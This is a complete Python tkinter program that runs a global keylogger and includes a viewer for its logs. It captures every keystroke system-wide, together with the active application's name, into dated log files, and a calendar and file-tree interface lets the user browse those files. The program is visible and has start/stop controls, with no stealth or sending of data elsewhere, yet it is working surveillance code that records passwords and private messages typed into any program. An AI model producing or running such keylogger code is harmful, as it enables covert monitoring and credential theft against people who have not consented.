import tkinter as tk
from tkinter import ttk, scrolledtext
from tkcalendar import Calendar
import datetime
import os
import platform
import threading
from pynput import keyboard
import glob
from tkinter import messagebox, Menu

# Detect OS and import appropriate libraries for process monitoring
if platform.system() == "Windows":
    try:
        import win32gui
        import win32process
        import psutil

        WINDOWS_LIBS_AVAILABLE = True
    except ImportError:
        WINDOWS_LIBS_AVAILABLE = False
        print("Warning: pywin32 and psutil not installed. Install with: pip install pywin32 psutil")


    def get_active_window():
        if not WINDOWS_LIBS_AVAILABLE:
            return "N/A (libraries not installed)"
        try:
            window = win32gui.GetForegroundWindow()
            pid = win32process.GetWindowThreadProcessId(window)[1]
            process = psutil.Process(pid)
            window_title = win32gui.GetWindowText(window)
            return f"{process.name()} - {window_title}"
        except:
            return "Unknown"

elif platform.system() == "Darwin":
    try:
        from AppKit import NSWorkspace

        MACOS_LIBS_AVAILABLE = True
    except ImportError:
        MACOS_LIBS_AVAILABLE = False
        print("Warning: pyobjc not installed. Install with: pip install pyobjc-framework-Cocoa")


    def get_active_window():
        if not MACOS_LIBS_AVAILABLE:
            return "N/A (libraries not installed)"
        try:
            active_app = NSWorkspace.sharedWorkspace().activeApplication()
            return f"{active_app['NSApplicationName']}"
        except:
            return "Unknown"

elif platform.system() == "Linux":
    import subprocess


    def get_active_window():
        try:
            window_id = subprocess.check_output(['xdotool', 'getactivewindow']).decode().strip()
            window_name = subprocess.check_output(['xdotool', 'getwindowname', window_id]).decode().strip()
            return window_name
        except:
            return "Unknown"
else:
    def get_active_window():
        return "Unsupported OS"


def get_log_filename(log_directory):
    """Generate log filename based on current date"""
    date_str = datetime.datetime.now().strftime("%Y-%m-%d")  # FIXED: strftime not strptime
    return os.path.join(log_directory, f"keylog_{date_str}.txt")


def organize_log_files(log_directory):
    """Organize log files by Month > Day > Year structure"""
    if not os.path.exists(log_directory):
        return {}

    # Find all log files
    log_files = glob.glob(os.path.join(log_directory, "keylog_*.txt"))

    # Structure: {month: {day: [(year, filepath), ]}}
    organized = {}

    for filepath in log_files:
        filename = os.path.basename(filepath)
        # Extract date from filename: keylog_YYYY-MM-DD.txt
        try:
            date_part = filename.replace("keylog_", "").replace(".txt", "")  # FIXED: keylog_ not keylog-
            date_obj = datetime.datetime.strptime(date_part, "%Y-%m-%d")

            month = date_obj.strftime("%B")  # FIXED: strftime not strptime
            day = date_obj.strftime("%d")     # FIXED: strftime not strptime
            year = date_obj.strftime("%Y")    # FIXED: strftime not strptime

            if month not in organized:
                organized[month] = {}
            if day not in organized[month]:
                organized[month][day] = []

            organized[month][day].append((year, filepath))
        except ValueError:
            continue  # Skip invalid filenames

    return organized


class KeyloggerViewerUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger with Viewer")
        self.root.geometry("1200x700")
        self.root.configure(bg="#f0f0f0")

        self.log_directory = "keylogs"
        self.is_logging = False
        self.current_executable = "Not running"
        self.listener = None

        # Keylogger state
        self.current_window = ""
        self.current_log_file = ""

        # File tree state
        self.selected_file_path = None
        self.file_tree_items = {}  # Store tree item IDs for later reference

        # Create log directory if it doesn't exist
        if not os.path.exists(self.log_directory):
            os.makedirs(self.log_directory)

        # Create main container
        self.create_ui()

        # Start updating status
        self.update_status()

    def create_ui(self):
        # Main frame
        main_frame = ttk.Frame(self.root)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # Left panel - Calendar and Controls
        left_panel = ttk.Frame(main_frame, width=300)
        left_panel.pack(side=tk.LEFT, fill=tk.BOTH, padx=(0, 10))

        # Keylogger Control Section
        control_frame = ttk.LabelFrame(left_panel, text="Keylogger Control", padding=10)
        control_frame.pack(fill=tk.X, pady=(0, 10))

        self.start_btn = ttk.Button(
            control_frame,
            text="▶ Start Logging",
            command=self.start_logging,
            style="Start.TButton"
        )
        self.start_btn.pack(fill=tk.X, pady=5)

        self.stop_btn = ttk.Button(
            control_frame,
            text="⏸ Stop Logging",
            command=self.stop_logging,
            state=tk.DISABLED,
            style="Stop.TButton"
        )
        self.stop_btn.pack(fill=tk.X, pady=5)

        # Status indicator
        self.logging_status = ttk.Label(
            control_frame,
            text="● Stopped",
            font=("Arial", 10, "bold"),
            foreground="red"
        )
        self.logging_status.pack(pady=5)

        # File Tree Section
        tree_label = ttk.Label(left_panel, text="Log Files", font=("Arial", 14, "bold"))
        tree_label.pack(pady=(0, 10))

        # Frame for tree and scrollbar
        tree_frame = ttk.Frame(left_panel)
        tree_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))

        # Scrollbar for tree
        tree_scroll = ttk.Scrollbar(tree_frame)
        tree_scroll.pack(side=tk.RIGHT, fill=tk.Y)

        # Create Treeview
        self.file_tree = ttk.Treeview(
            tree_frame,
            yscrollcommand=tree_scroll.set,
            selectmode='browse',
            height=8
        )
        self.file_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        tree_scroll.config(command=self.file_tree.yview)

        # Bind events
        self.file_tree.bind('<Double-Button-1>', self.on_tree_double_click)
        self.file_tree.bind('<Button-3>', self.on_tree_right_click)  # Right-click

        # Search box
        search_frame = ttk.Frame(left_panel)
        search_frame.pack(fill=tk.X, pady=(0, 10))

        ttk.Label(search_frame, text="🔍", font=("Arial", 12)).pack(side=tk.LEFT, padx=(0, 5))
        self.search_var = tk.StringVar()
        self.search_var.trace('w', self.filter_tree)
        search_entry = ttk.Entry(search_frame, textvariable=self.search_var)
        search_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)

        # Populate the tree initially
        self.populate_file_tree()

        # Calendar Section (below file tree)
        calendar_label = ttk.Label(left_panel, text="Select Date", font=("Arial", 14, "bold"))
        calendar_label.pack(pady=(10, 10))

        # Calendar widget
        self.calendar = Calendar(
            left_panel,
            selectmode='day',
            year=datetime.datetime.now().year,
            month=datetime.datetime.now().month,
            day=datetime.datetime.now().day,
            background="darkblue",
            foreground="white",
            headersbackground="lightblue",
            normalbackground="white",
            weekendbackground="lightyellow",
            selectbackground="red",
            font=("Arial", 10)
        )
        self.calendar.pack(fill=tk.BOTH, expand=True)

        # Load button
        load_btn = ttk.Button(left_panel, text="Load Selected Date", command=self.load_log_file)
        load_btn.pack(pady=10, fill=tk.X)

        # Refresh button
        refresh_btn = ttk.Button(left_panel, text="🔄 Refresh Current", command=self.refresh_current_log)
        refresh_btn.pack(pady=(0, 10), fill=tk.X)

        # Auto-refresh checkbox
        self.auto_refresh_var = tk.BooleanVar(value=True)
        auto_refresh_check = ttk.Checkbutton(
            left_panel,
            text="Auto-refresh viewer",
            variable=self.auto_refresh_var
        )
        auto_refresh_check.pack(pady=(0,10))

        # Right panel - Viewing Area
        right_panel = ttk.Frame(main_frame)
        right_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        # Status Header
        status_frame = ttk.Frame(right_panel)
        status_frame.pack(fill=tk.X, pady=(0, 10))

        # Connection status label
        ttk.Label(status_frame, text="Status:", font=("Arial", 10)).pack(side=tk.LEFT, padx=5)
        self.status_label = ttk.Label(
            status_frame,
            text="Ready",
            font=("Arial", 11, "bold"),
            foreground="orange"
        )
        self.status_label.pack(side=tk.LEFT, padx=5)

        # Separator
        ttk.Separator(status_frame, orient=tk.VERTICAL).pack(side=tk.LEFT, fill=tk.Y, padx=10)

        # Tracked executable
        ttk.Label(status_frame, text="Tracking:", font=("Arial", 10)).pack(side=tk.LEFT)
        self.executable_label = ttk.Label(
            status_frame,
            text=self.current_executable,
            font=("Arial", 10, "bold"),
            foreground="blue"
        )
        self.executable_label.pack(side=tk.LEFT, padx=5)

        # Separator line
        ttk.Separator(right_panel, orient=tk.HORIZONTAL).pack(fill=tk.X, pady=5)

        # Date display
        self.date_label = ttk.Label(
            right_panel,
            text="No date selected",
            font=("Arial", 12, "bold")
        )
        self.date_label.pack(pady=5)

        # Central Viewing Area - Text display
        view_frame = ttk.Frame(right_panel)
        view_frame.pack(fill=tk.BOTH, expand=True)

        # ScrolledText widget for log content
        self.log_text = scrolledtext.ScrolledText(
            view_frame,
            wrap=tk.WORD,
            font=("Consolas", 9),
            bg="#1e1e1e",
            fg="#d4d4d4",
            insertbackground="white"
        )
        self.log_text.pack(fill=tk.BOTH, expand=True)

        # Bottom info bar
        info_frame = ttk.Frame(right_panel)
        info_frame.pack(fill=tk.X, pady=(10, 0))

        self.info_label = ttk.Label(
            info_frame,
            text="Start keylogger or select a date to view logs",
            font=("Arial", 9),
            foreground="gray"
        )
        self.info_label.pack(side=tk.LEFT)

    def populate_file_tree(self, filter_text=""):  # FIXED: default empty string, not space
        """Populate the file tree with log files organized by Month > Day > Year"""
        # Clear existing items

        expanded_items = set()
        for item in self.file_tree.get_children():
            if self.file_tree.item(item, 'open'):
                expanded_items.add(self.file_tree.item(item, 'text'))
            # Check children (days)
            for child in self.file_tree.get_children(item):
                if self.file_tree.item(child, 'open'):
                    expanded_items.add(self.file_tree.item(child, 'text'))


        # Clear existing items
        for item in self.file_tree.get_children():
            self.file_tree.delete(item)

        self.file_tree_items.clear()


        # Get organized files
        organized = organize_log_files(self.log_directory)

        # Sort months chronologically
        month_order = ["January", "February", "March", "April", "May", "June",
                       "July", "August", "September", "October", "November", "December"]

        for month in month_order:
            if month not in organized:
                continue

            # Apply filter
            if filter_text and filter_text.lower() not in month.lower():
                # Check if any day/year matches
                has_match = False
                for day in organized[month]:
                    for year, _ in organized[month][day]:
                        if filter_text.lower() in f"{month} {day} {year}".lower():
                            has_match = True
                            break
                if not has_match:
                    continue


            # Create month node
            month_text = f"📁 {month}"
            was_expanded = month_text in expanded_items
            month_id = self.file_tree.insert("", "end", text=month_text, open=was_expanded)

            #Sort days numerically
            days = sorted(organized[month].keys(), key=lambda x: int(x))

            for day in days:
                # Create day node
                day_text = f"📅 Day {day}"
                was_day_expanded = day_text in expanded_items
                day_id = self.file_tree.insert(month_id, "end", text=day_text, open=was_day_expanded)

                # Sort years (newest first)
                years_files = sorted(organized[month][day], key=lambda x: x[0], reverse=True)

                for year, filepath in years_files:
                    # Apply filter
                    display_text =f"{month} {day} {year}"
                    if filter_text and filter_text.lower() not in display_text.lower():
                        continue

                    # Create file node
                    file_id = self.file_tree.insert(
                        day_id,
                        "end",
                        text=f"📄 {year}",
                        tags=('file',)
                    )


                    # Store filepath for this item
                    self.file_tree_items[file_id] = filepath
                    # This saves which folders were open before refreshing, then re-opens them after rebuild.






    def filter_tree(self, *args):
        """Filter tree view based on search text"""
        filter_text = self.search_var.get()
        self.populate_file_tree(filter_text)

    def on_tree_double_click(self, event):
        """Handle double-click on tree item to open file"""
        selected = self.file_tree.selection()
        if not selected:
            return

        item_id = selected[0]

        # Check if it's a file (has filepath stored)
        if item_id in self.file_tree_items:
            filepath = self.file_tree_items[item_id]
            self.load_log_file_from_path(filepath)

    def on_tree_right_click(self, event):
        """Show context menu on right-click"""
        # Select the item under cursor
        item_id = self.file_tree.identify_row(event.y)  # FIXED: identify_row not identitfy_row
        if not item_id:
            return

        self.file_tree.selection_set(item_id)

        # Only show menu for actual files
        if item_id not in self.file_tree_items:
            return

        # Create context menu
        context_menu = Menu(self.root, tearoff=0)
        context_menu.add_command(label="Open", command=lambda: self.on_tree_double_click(None))
        context_menu.add_command(label="Delete", command=lambda: self.delete_selected_file(item_id))
        context_menu.add_separator()
        context_menu.add_command(label="Refresh", command=self.populate_file_tree)

        # Show menu
        context_menu.post(event.x_root, event.y_root)

    def delete_selected_file(self, item_id):
        """Delete the selected log file"""
        if item_id not in self.file_tree_items:
            return

        filepath = self.file_tree_items[item_id]
        filename = os.path.basename(filepath)

        # Confirm deletion
        confirm = messagebox.askyesno(
            "Confirm Delete",
            f"Are you sure you want to delete:\n{filename}?\n\nThis cannot be undone."
        )

        if confirm:
            try:
                os.remove(filepath)
                messagebox.showinfo("Success", f"Deleted: {filename}")
                # Refresh tree
                self.populate_file_tree()
                # Clear viewer if this file was displayed
                if self.selected_file_path == filepath:
                    self.log_text.delete(1.0, tk.END)
                    self.date_label.config(text="File deleted")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to delete file:\n{str(e)}")

    def load_log_file_from_path(self, filepath):
        """Load a log file from its full path"""
        self.selected_file_path = filepath
        filename = os.path.basename(filepath)

        # Extract and display date
        try:
            date_part = filename.replace("keylog_", "").replace(".txt", "")
            date_obj = datetime.datetime.strptime(date_part, "%Y-%m-%d")  # FIXED: strptime not strtime
            self.date_label.config(text=f"Log for: {date_obj.strftime('%B %d, %Y')}")  # FIXED: strftime not strptime
        except:
            self.date_label.config(text=f"Log: {filename}")

        # Clear and load content
        self.log_text.delete(1.0, tk.END)

        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                content = f.read()
                self.log_text.insert(1.0, content)
                self.log_text.see(tk.END)
                self.info_label.config(
                    text=f"Loaded: {filename}",  # FIXED: added f-string
                    foreground="green"
                )
        except Exception as e:
            self.log_text.insert(1.0, f"Error reading file: {str(e)}")  # FIXED: reading not reding
            self.info_label.config(
                text=f"Error loading file: {str(e)}",
                foreground="red"
            )

    def start_logging(self):
        """Start the keylogger"""
        if not self.is_logging:
            self.is_logging = True
            self.start_btn.config(state=tk.DISABLED)
            self.stop_btn.config(state=tk.NORMAL)
            self.logging_status.config(text="● Logging", foreground="green")
            self.status_label.config(text="Connected", foreground="green")

            # Start listener in a separate thread
            def start_listener():
                self.listener = keyboard.Listener(on_press=self.on_press)
                self.listener.start()
                self.listener.join()

            self.listener_thread = threading.Thread(target=start_listener, daemon=True)
            self.listener_thread.start()

            self.info_label.config(
                text="Keylogger is running. All keystrokes are being logged.",
                foreground="green"
            )

    def stop_logging(self):
        """Stop the keylogger"""
        if self.is_logging:
            self.is_logging = False
            if self.listener:
                self.listener.stop()
            self.start_btn.config(state=tk.NORMAL)
            self.stop_btn.config(state=tk.DISABLED)
            self.logging_status.config(text="● Stopped", foreground="red")
            self.status_label.config(text="Ready", foreground="orange")
            self.current_executable = "Not running"

            self.info_label.config(
                text="Keylogger stopped.",
                foreground="red"
            )

    def on_press(self, key):
        """Handle key press events - from original keylogger code"""
        if not self.is_logging:
            return

        # Get the log file for today
        log_file = get_log_filename(self.log_directory)

        # Check if we've switched to a new day's log file
        if log_file != self.current_log_file:
            self.current_log_file = log_file
            with open(log_file, "a", encoding="utf-8") as f:
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")  # FIXED: strftime not strptime
                f.write(f"\n{'=' * 60}\n")
                f.write(f"[{timestamp}] NEW SESSION STARTED\n")
                f.write(f"{'=' * 60}\n")

        # Get current active window
        active_window = get_active_window()

        # Log window change
        if active_window != self.current_window:
            self.current_window = active_window
            with open(log_file, "a", encoding="utf-8") as f:
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")  # FIXED: strftime not strptime
                f.write(f"\n{'=' * 60}\n")
                f.write(f"[{timestamp}] APPLICATION: {self.current_window}\n")
                f.write(f"{'=' * 60}\n")

        # Log keystroke with timestamp
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")  # FIXED: strftime not strptime

        try:
            # Regular character keys
            with open(log_file, "a", encoding="utf-8") as f:
                f.write(f"[{timestamp}] {key.char}\n")
        except AttributeError:
            # Special keys
            with open(log_file, "a", encoding="utf-8") as f:
                if key == keyboard.Key.space:
                    f.write(f"[{timestamp}] [SPACE]\n")
                elif key == keyboard.Key.enter:
                    f.write(f"[{timestamp}] [ENTER]\n")
                elif key == keyboard.Key.tab:
                    f.write(f"[{timestamp}] [TAB]\n")
                elif key == keyboard.Key.backspace:
                    f.write(f"[{timestamp}] [BACKSPACE]\n")
                else:
                    f.write(f"[{timestamp}] {key}\n")

    def load_log_file(self):
        """Load log file for selected date"""
        # Get selected date from calendar
        selected_date = self.calendar.get_date()

        # Convert to datetime object and format
        date_obj = datetime.datetime.strptime(selected_date, "%m/%d/%y")
        date_str = date_obj.strftime("%Y-%m-%d")  # FIXED: strftime not strptime

        # Construct filename
        log_filename = os.path.join(self.log_directory, f"keylog_{date_str}.txt")

        # Update date label
        self.date_label.config(text=f"Log for: {date_obj.strftime('%B %d, %Y')}")  # FIXED: strftime not strptime

        # Clear current content
        self.log_text.delete(1.0, tk.END)

        # Try to load and display the file
        if os.path.exists(log_filename):
            try:
                with open(log_filename, 'r', encoding='utf-8') as f:
                    content = f.read()
                    self.log_text.insert(1.0, content)
                    # Auto-scroll to bottom
                    self.log_text.see(tk.END)
                    self.info_label.config(
                        text=f"Loaded: {log_filename}",
                        foreground="green"
                    )
            except Exception as e:
                self.log_text.insert(1.0, f"Error reading file: {str(e)}")
                self.info_label.config(
                    text=f"Error loading file: {str(e)}",
                    foreground="red"
                )
        else:
            self.log_text.insert(
                1.0,
                f"No log file found for {date_obj.strftime('%B %d, %Y')}\n\n"  # FIXED: strftime not strptime
                f"Expected file: {log_filename}\n\n"
                f"This could mean:\n"
                f"• No keylogging data was recorded on this date\n"
                f"• The log file hasn't been created yet\n"
                f"• The keylogger wasn't running on this date"
            )
            self.info_label.config(
                text=f"No log file found for selected date",
                foreground="orange"
            )

    def refresh_current_log(self):
        """Refresh the currently displayed log file"""
        if self.is_logging:
            # Load today's log
            today = datetime.datetime.now()
            self.calendar.selection_set(today)
            self.load_log_file()
        else:
            # Just reload the selected date
            self.load_log_file()

    def update_status(self):
        """Update current executable being tracked"""
        if self.is_logging:
            try:
                self.current_executable = get_active_window()
                self.executable_label.config(text=self.current_executable)
            except:
                self.executable_label.config(text="Unknown")
        else:
            self.executable_label.config(text="Not running")

        # Auto-refresh the currently displayed log file if it's today's file
        if self.selected_file_path and self.auto_refresh_var.get():  # Add this check

            # Auto-refresh file tree if logging (new files may be created)
            if self.is_logging:
                self.populate_file_tree(self.search_var.get())

            # Auto-refresh the currently displayed log file if it's today's file
            if self.selected_file_path:
                # Check if the displayed file is today's log
                today_log = get_log_filename(self.log_directory)
                if self.selected_file_path == today_log:
                    # Refresh the content without changing scroll position
                    current_position = self.log_text.yview()[0] # Save scroll position
                    try:
                        with open(self.selected_file_path, 'r', encoding='utf-8') as f:
                            content = f.read()
                            self.log_text.delete(1.0, tk. END)
                            self.log_text.insert(1.0, content)
                            # Restore scroll position (or go to bottom if user was at the bottom)
                            if current_position > 0.9:
                                self.log_text.see(tk.END)
                            else:
                                self.log_text.yview_moveto(current_position)
                    except:
                        pass # File might be locked, skip this refresh

        # Schedule next update (every 2 seconds)
        self.root.after(2000, self.update_status)


def main():
    root = tk.Tk()

    # Configure button styles
    style = ttk.Style()
    style.configure("Start.TButton", foreground="green")
    style.configure("Stop.TButton", foreground="red")

    app = KeyloggerViewerUI(root)

    # Handle window close
    def on_closing():
        if app.is_logging:
            app.stop_logging()
        root.destroy()

    root.protocol("WM_DELETE_WINDOW", on_closing)
    root.mainloop()


if __name__ == "__main__":
    main()